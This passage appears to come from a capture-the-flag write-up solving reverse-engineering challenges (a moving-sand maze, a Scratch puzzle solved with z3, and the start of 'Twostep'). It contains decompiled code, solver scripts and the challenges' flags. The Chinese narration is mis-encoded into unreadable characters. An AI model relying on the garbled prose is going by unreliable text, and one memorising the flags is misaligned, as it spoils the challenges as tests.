class="line">  <span class="type">int</span> m; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  result = (step % <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">9</span>; i &gt;= <span class="number">0</span>; --i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">9</span>; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        result = maze[<span class="number">10</span> * j + i];</span><br><span class="line">        <span class="keyword">if</span> ( result == <span class="string">&#x27;S&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          result = j;</span><br><span class="line">          <span class="keyword">if</span> ( j &gt;= <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            result = (i + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> ( (result &amp; <span class="number">0x80000000</span>) == <span class="number">0LL</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              result = (i + <span class="number">1</span>);</span><br><span class="line">              <span class="keyword">if</span> ( result &lt;= <span class="number">9</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                result = maze[<span class="number">10</span> * j + <span class="number">1</span> + i];</span><br><span class="line">                <span class="keyword">if</span> ( result == <span class="string">&#x27;.&#x27;</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  maze[<span class="number">10</span> * j + i] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                  result = &amp;maze[<span class="number">10</span> * j + <span class="number">1</span> + i];</span><br><span class="line">                  *result = <span class="string">&#x27;S&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( result &lt;= <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">9</span>; ++k )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt;= <span class="number">9</span>; ++m )</span><br><span class="line">        &#123;</span><br><span class="line">          result = maze[<span class="number">10</span> * k + m];</span><br><span class="line">          <span class="keyword">if</span> ( result == <span class="string">&#x27;S&#x27;</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            result = (k - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> ( (result &amp; <span class="number">0x80000000</span>) == <span class="number">0LL</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              result = (k - <span class="number">1</span>);</span><br><span class="line">              <span class="keyword">if</span> ( result &lt;= <span class="number">9</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                result = m;</span><br><span class="line">                <span class="keyword">if</span> ( m &gt;= <span class="number">0</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  result = maze[<span class="number">10</span> * k - <span class="number">10</span> + m];</span><br><span class="line">                  <span class="keyword">if</span> ( result == <span class="string">&#x27;.&#x27;</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    maze[<span class="number">10</span> * k + m] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                    result = &amp;maze[<span class="number">10</span> * k - <span class="number">10</span> + m];</span><br><span class="line">                    *result = <span class="string">&#x27;S&#x27;</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( result == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt;= <span class="number">9</span>; ++n )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">for</span> ( ii = <span class="number">0</span>; ii &lt;= <span class="number">9</span>; ++ii )</span><br><span class="line">          &#123;</span><br><span class="line">            result = maze[<span class="number">10</span> * ii + n];</span><br><span class="line">            <span class="keyword">if</span> ( result == <span class="string">&#x27;S&#x27;</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              result = ii;</span><br><span class="line">              <span class="keyword">if</span> ( ii &gt;= <span class="number">0</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                result = (n - <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span> ( (result &amp; <span class="number">0x80000000</span>) == <span class="number">0LL</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  result = (n - <span class="number">1</span>);</span><br><span class="line">                  <span class="keyword">if</span> ( result &lt;= <span class="number">9</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    result = maze[<span class="number">10</span> * ii - <span class="number">1</span> + n];</span><br><span class="line">                    <span class="keyword">if</span> ( result == <span class="string">&#x27;.&#x27;</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                      maze[<span class="number">10</span> * ii + n] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                      result = &amp;maze[<span class="number">10</span> * ii - <span class="number">1</span> + n];</span><br><span class="line">                      *result = <span class="string">&#x27;S&#x27;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( jj = <span class="number">9</span>; jj &gt;= <span class="number">0</span>; --jj )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( kk = <span class="number">0</span>; kk &lt;= <span class="number">9</span>; ++kk )</span><br><span class="line">        &#123;</span><br><span class="line">          result = maze[<span class="number">10</span> * jj + kk];</span><br><span class="line">          <span class="keyword">if</span> ( result == <span class="string">&#x27;S&#x27;</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            result = (jj + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> ( (result &amp; <span class="number">0x80000000</span>) == <span class="number">0LL</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              result = (jj + <span class="number">1</span>);</span><br><span class="line">              <span class="keyword">if</span> ( result &lt;= <span class="number">9</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                result = kk;</span><br><span class="line">                <span class="keyword">if</span> ( kk &gt;= <span class="number">0</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  result = maze[<span class="number">10</span> * jj + <span class="number">10</span> + kk];</span><br><span class="line">                  <span class="keyword">if</span> ( result == <span class="string">&#x27;.&#x27;</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    maze[<span class="number">10</span> * jj + kk] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                    result = &amp;maze[<span class="number">10</span> * jj + <span class="number">10</span> + kk];</span><br><span class="line">                    *result = <span class="string">&#x27;S&#x27;</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ—¢ç„¶æ˜¯ä¼šåŠ¨çš„è¿·å®« é‚£ç›¯ç€çœ‹åŸæ¥çš„è¿·å®«çœ‹æ˜¯å‡ ä¹ä¸å¯èƒ½è§£å‡ºæ¥çš„ è¿™é‡Œæä¾›ä¸€ä¸ªpythonç¨‹åºæ¨¡ä»¿è¿·å®«çš„è¿ä½œå¹¶è®°å½•æ­¥æ•°:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">print_maze</span>(<span class="params">maze, player_pos</span>):</span><br><span class="line">    <span class="keyword">for</span> i, row <span class="keyword">in</span> <span class="built_in">enumerate</span>(maze):</span><br><span class="line">        <span class="keyword">for</span> j, cell <span class="keyword">in</span> <span class="built_in">enumerate</span>(row):</span><br><span class="line">            <span class="keyword">if</span> (i, j) == player_pos:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;$&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(cell, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">move_player</span>(<span class="params">maze, direction, player_pos</span>):</span><br><span class="line">    row, col = player_pos</span><br><span class="line">    <span class="keyword">if</span> direction == <span class="string">&#x27;w&#x27;</span> <span class="keyword">and</span> row &gt; <span class="number">0</span> <span class="keyword">and</span> maze[row - <span class="number">1</span>][col] != <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">        maze[row][col], maze[row - <span class="number">1</span>][col] = maze[row - <span class="number">1</span>][col], maze[row][col]</span><br><span class="line">        <span class="keyword">return</span> (row - <span class="number">1</span>, col)</span><br><span class="line">    <span class="keyword">elif</span> direction == <span class="string">&#x27;s&#x27;</span> <span class="keyword">and</span> row &lt; <span class="built_in">len</span>(maze) - <span class="number">1</span> <span class="keyword">and</span> maze[row + <span class="number">1</span>][col] != <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">        maze[row][col], maze[row + <span class="number">1</span>][col] = maze[row + <span class="number">1</span>][col], maze[row][col]</span><br><span class="line">        <span class="keyword">return</span> (row + <span class="number">1</span>, col)</span><br><span class="line">    <span class="keyword">elif</span> direction == <span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> col &gt; <span class="number">0</span> <span class="keyword">and</span> maze[row][col - <span class="number">1</span>] != <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">        maze[row][col], maze[row][col - <span class="number">1</span>] = maze[row][col - <span class="number">1</span>], maze[row][col]</span><br><span class="line">        <span class="keyword">return</span> (row, col - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">elif</span> direction == <span class="string">&#x27;d&#x27;</span> <span class="keyword">and</span> col &lt; <span class="built_in">len</span>(maze[<span class="number">0</span>]) - <span class="number">1</span> <span class="keyword">and</span> maze[row][col + <span class="number">1</span>] != <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">        maze[row][col], maze[row][col + <span class="number">1</span>] = maze[row][col + <span class="number">1</span>], maze[row][col]</span><br><span class="line">        <span class="keyword">return</span> (row, col + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> player_pos</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spread_sands</span>(<span class="params">maze, step</span>):</span><br><span class="line">    rows, cols = <span class="built_in">len</span>(maze), <span class="built_in">len</span>(maze[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> step % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rows - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(cols):</span><br><span class="line">          <span class="keyword">if</span> maze[i][j] == <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> i &lt; rows - <span class="number">1</span> <span class="keyword">and</span> maze[i + <span class="number">1</span>][j] == <span class="string">&#x27;o&#x27;</span>:</span><br><span class="line">                maze[i][j], maze[i + <span class="number">1</span>][j] = maze[i + <span class="number">1</span>][j], maze[i][j]</span><br><span class="line">    <span class="keyword">elif</span> step % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(cols - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">          <span class="keyword">if</span> maze[i][j] == <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> j &lt; cols - <span class="number">1</span> <span class="keyword">and</span> maze[i][j + <span class="number">1</span>] == <span class="string">&#x27;o&#x27;</span>:</span><br><span class="line">                maze[i][j], maze[i][j + <span class="number">1</span>] = maze[i][j + <span class="number">1</span>], maze[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> step % <span class="number">4</span> == <span class="number">2</span>:</span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(cols):</span><br><span class="line">          <span class="keyword">if</span> maze[i][j] == <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> maze[i - <span class="number">1</span>][j] == <span class="string">&#x27;o&#x27;</span>:</span><br><span class="line">                maze[i][j], maze[i - <span class="number">1</span>][j] = maze[i - <span class="number">1</span>][j], maze[i][j]</span><br><span class="line">    <span class="keyword">elif</span> step % <span class="number">4</span> == <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(cols):</span><br><span class="line">          <span class="keyword">if</span> maze[i][j] == <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> j &gt; <span class="number">0</span> <span class="keyword">and</span> maze[i][j - <span class="number">1</span>] == <span class="string">&#x27;o&#x27;</span>:</span><br><span class="line">                maze[i][j], maze[i][j - <span class="number">1</span>] = maze[i][j - <span class="number">1</span>], maze[i][j]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    maze_str = <span class="string">&quot;&quot;&quot;o###ooooo#</span></span><br><span class="line"><span class="string">                  oo#So##oo#</span></span><br><span class="line"><span class="string">                  #oS#o#SSo#</span></span><br><span class="line"><span class="string">                  #oo#o#oo##</span></span><br><span class="line"><span class="string">                  oSo#o#oSSo</span></span><br><span class="line"><span class="string">                  o###o#oSoo</span></span><br><span class="line"><span class="string">                  ooo#o#oooS</span></span><br><span class="line"><span class="string">                  ##o#o####o</span></span><br><span class="line"><span class="string">                  oSoSo#ooSo</span></span><br><span class="line"><span class="string">                  ooSoo#LSoo&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    maze = [<span class="built_in">list</span>(row.strip()) <span class="keyword">for</span> row <span class="keyword">in</span> maze_str.split(<span class="string">&#x27;\n&#x27;</span>)]</span><br><span class="line">    player_pos = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    step = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> maze[player_pos[<span class="number">0</span>]][player_pos[<span class="number">1</span>]] != <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">        print_maze(maze, player_pos)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Step: <span class="subst">&#123;step&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">        direction = <span class="built_in">input</span>(<span class="string">&quot;Enter your move (w/a/s/d): &quot;</span>)</span><br><span class="line">        player_pos = move_player(maze, direction, player_pos)</span><br><span class="line">        spread_sands(maze, step)</span><br><span class="line">        step += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;WIN&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å› ä¸ºæˆ‘çš„ç§»åŠ¨é€»è¾‘æ˜¯äº¤æ¢ æ‰€ä»¥ç¨‹åºè¿˜æ˜¯æœ‰ç‚¹ç‘•ç–µ(ä½ ä¸ä¼šèµ¢ ä¹Ÿä¸ä¼šä¼¼) ä½†æ˜¯ä½œä¸ºä¸€ä¸ªåšå‡ºç­”æ¡ˆçš„è¾…åŠ©å·¥å…·è¿˜æ˜¯è¶³å¤Ÿçš„</p>
<p>å¦å¤–éœ€è¦æ³¨æ„çš„æ˜¯ é™„ä»¶ä¸­çš„è¿·å®«è¿ä½œé€»è¾‘æ˜¯:</p>
<ol>
<li><code>S</code>ç§»åŠ¨</li>
<li>ç©å®¶æ‰€åœ¨è¡Œ, åˆ—å˜åŒ–</li>
<li>åˆ¤æ–­ç©å®¶æ‰€åœ¨è¡Œ, åˆ—æ˜¯å¦æ˜¯<code>S</code></li>
</ol>
<p>æ‰€ä»¥å…¶å®æ˜¯å¯ä»¥å®ç°ç±»ä¼¼å±…åˆå’Œè§åˆ‡çš„æ•ˆæœçš„(ç©å¤ªåˆ€ç©çš„) ä¸ç„¶ä¹Ÿæ— æ³•é€šå…³ e.g.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">        â†’		â†’</span><br><span class="line">â†“$    âˆš	$o	âˆš	So	âˆš</span><br><span class="line">â†‘S       â†‘S	   â†‘$</span><br></pre></td></tr></table></figure>

<p>æœ€åå¾—åˆ°è·¯çº¿åncåˆ°å®˜æ–¹çš„ç«¯å£å¹¶è¾“å…¥è·¯çº¿ å¾—åˆ°flag:<code>nbctf&#123;5lowly_5huffl3d 5wa110wing_54nd5&#125;</code></p>
<h2 id="Itchy-Scratchy-Scratchç¼–ç¨‹é€†å‘"><a href="#Itchy-Scratchy-Scratchç¼–ç¨‹é€†å‘" class="headerlink" title="Itchy Scratchy | Scratchç¼–ç¨‹é€†å‘"></a><strong>Itchy Scratchy</strong> | Scratchç¼–ç¨‹é€†å‘</h2><p>æ²¡æœ‰æ··æ·†é€»è¾‘å¾ˆæ¸…æ™°çš„Scratchå·¥ç¨‹æ–‡ä»¶:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-102029.png" alt="image-20231204194621457"></p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-102102.png" alt="image-20231204195439820"></p>
<p><code>alpha</code>å’Œ<code>enc</code>ä¹Ÿéƒ½ç»™å‡ºäº† å”¯ä¸€çš„é—®é¢˜æ˜¯æœ€åéœ€è¦è§£æ–¹ç¨‹ è¿™é‡Œç”¨z3æ±‚è§£</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">name = [<span class="number">29</span>,<span class="number">26</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">32</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">21</span>,<span class="number">10</span>]</span><br><span class="line">alpha = <span class="string">&#x27;zvtwrca57n49u2by1jdqo6g0ksxfi8pelmh3&#x27;</span></span><br><span class="line">enc = [<span class="number">902</span>,<span class="number">764</span>,<span class="number">141</span>,<span class="number">454</span>,<span class="number">207</span>,<span class="number">51</span>,<span class="number">532</span>,<span class="number">1013</span>,<span class="number">496</span>,<span class="number">181</span>,<span class="number">562</span>,<span class="number">342</span>]</span><br><span class="line">j = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">13</span>):</span><br><span class="line">    j.append((i * i + name[i - <span class="number">1</span>]) % <span class="built_in">len</span>(name))</span><br><span class="line">factor = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    factor.append(name[i] * name[j[i]])</span><br><span class="line">enc = [enc[i] - factor[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>)]</span><br><span class="line">vi = IntVector(<span class="string">&#x27;vi&#x27;</span>, <span class="number">12</span>)</span><br><span class="line">s = Solver()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    s.add(vi[i] * vi[j[i]] == enc[i])</span><br><span class="line">result = s.check()</span><br><span class="line"><span class="keyword">if</span> result == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    vi_values = [m[vi[i]].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>)]</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> vi_values:</span><br><span class="line">        <span class="built_in">print</span>(each, end=<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;No solution&#x27;</span>)</span><br><span class="line"><span class="comment"># [17, 14, 33, 32, 3, 3, 36, 5, 28, 17, 11, 12]</span></span><br><span class="line">intput = [<span class="number">17</span>, <span class="number">14</span>, <span class="number">33</span>, <span class="number">32</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">36</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">12</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nnbctf&#123;&quot;</span>, end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> intput:</span><br><span class="line">    <span class="built_in">print</span>(alpha[each - <span class="number">1</span>], end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="comment"># nbctf&#123;12lett3rf149&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Twostep-æ„å¼åŠ å¯†"><a href="#Twostep-æ„å¼åŠ å¯†" class="headerlink" title="Twostep | æ„å¼åŠ å¯†"></a><strong>Twostep</strong> | æ„å¼åŠ å¯†</h2><p>é¢˜å¦‚å…¶å ç”¨äº†ç±»ä¼¼ä¸¤æ­¥èˆçš„åŠ å¯†æ–¹å¼ æœ‰ä¸€ç§ç‹¬ç‰¹çš„ç¾æ„Ÿ(ä½†æ˜¯é€†å‘çš„æ—¶å€™æ„Ÿè§‰ä¸å‡ºæ¥ğŸ˜¡)</p>
<p>ç”¨DIEæ‰“å¼€é™„ä»¶ 64ä½ELFæ— å£³</p>
<p>ä¸»å‡½æ•°çš„é€»è¾‘ä¾ç„¶å¾ˆç®€å•:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">40</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string(input, a2, a3);</span><br><span class="line">  v3 = print(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;C&#x27;mon y&#x27;all let&#x27;s boogie!\n&gt; &quot;</span>);</span><br><span class="line">  println(v3, &amp;<span class="built_in">std</span>::flush&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="built_in">std</span>::operator&gt;&gt;&lt;<span class="type">char</span>&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, input);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">std</span>::<span class="built_in">string</span>::length(input) == <span class="number">57</span> &amp;&amp; (v4 = <span class="built_in">std</span>::<span class="built_in">string</span>::c_str(input), encrypto(v4)) )</span><br><span class="line">    v6 = print(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Yeehaw!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v6 = print(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Aww shucks!&quot;</span>);</span><br><span class="line">  println(v6, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(input);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æ‰“å¼€<code>encrypto()</code>æ—¶å‡ºç°äº†IDAæ— æ³•åç¼–è¯‘çš„é”™è¯¯ å‘ç°æ˜¯text.40168Cå¤„å‘ç”Ÿäº†callæ— æ³•è§£æçš„é”™è¯¯<del>æˆ‘ä»¬å»çœ‹çœ‹è¿™ä¸ªé“¸å¸æ˜¯æ€ä¹ˆå›äº‹</del></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000040168B FF D0                         call    rax</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¸‹æ–‡ä¹Ÿçœ‹ä¸å‡ºraxå­˜æ”¾çš„æ˜¯å›ºå®šçš„æŸä¸ªå‡½æ•°è¿˜æ˜¯ä»€ä¹ˆ ä¸è¦ç´§æˆ‘ä»¬å…ˆnopæ‰å®ƒ é¡ºåˆ©åç¼–è¯‘äº†<code>encrypto()</code> å‘ç°å®ƒè°ƒç”¨äº†<code>encrypto2()</code>(è¿™äº›éƒ½æ˜¯æˆ‘è‡ªå·±å‘½åçš„) æ‰“å¼€<code>encrypto2()</code>å‘ç°å®ƒè°ƒç”¨äº†<code>encrypto()</code>â€¦ è¿™å°±æ˜¯â€ä¸¤æ­¥èˆâ€çš„å«ä¹‰ ä¸ç®¡ å…ˆåˆ†æä¸¤ä¸ªå‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">encrypto</span><span class="params">(_BYTE *input_6)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [rsp+19h] [rbp-A7h]</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+1Ah] [rbp-A6h]</span></span><br><span class="line">  __int16 v4; <span class="comment">// [rsp+1Ch] [rbp-A4h]</span></span><br><span class="line">  __int16 v5; <span class="comment">// [rsp+1Eh] [rbp-A2h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+20h] [rbp-A0h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 k; <span class="comment">// [rsp+20h] [rbp-A0h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+20h] [rbp-A0h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 m; <span class="comment">// [rsp+20h] [rbp-A0h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 j; <span class="comment">// [rsp+28h] [rbp-98h]</span></span><br><span class="line">  _BYTE *v11; <span class="comment">// [rsp+30h] [rbp-90h]</span></span><br><span class="line">  _BYTE *v12; <span class="comment">// [rsp+30h] [rbp-90h]</span></span><br><span class="line">  _BYTE *v13; <span class="comment">// [rsp+30h] [rbp-90h]</span></span><br><span class="line">  __int16 v14[<span class="number">4</span>]; <span class="comment">// [rsp+38h] [rbp-88h]</span></span><br><span class="line">  __int64 v15[<span class="number">6</span>]; <span class="comment">// [rsp+40h] [rbp-80h]</span></span><br><span class="line">  __int64 v16[<span class="number">8</span>]; <span class="comment">// [rsp+70h] [rbp-50h]</span></span><br><span class="line">  __int16 v17; <span class="comment">// [rsp+B6h] [rbp-Ah]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v18; <span class="comment">// [rsp+B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v18 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v14[<span class="number">0</span>] = <span class="number">18440</span>;</span><br><span class="line">  v14[<span class="number">1</span>] = <span class="number">3136</span>;</span><br><span class="line">  v14[<span class="number">2</span>] = <span class="number">18444</span>;</span><br><span class="line">  v14[<span class="number">3</span>] = <span class="number">16524</span>;</span><br><span class="line">  v16[<span class="number">0</span>] = <span class="number">1LL</span>;</span><br><span class="line">  v16[<span class="number">1</span>] = <span class="number">16LL</span>;</span><br><span class="line">  v16[<span class="number">2</span>] = <span class="number">32LL</span>;</span><br><span class="line">  v16[<span class="number">3</span>] = <span class="number">512LL</span>;</span><br><span class="line">  v16[<span class="number">4</span>] = <span 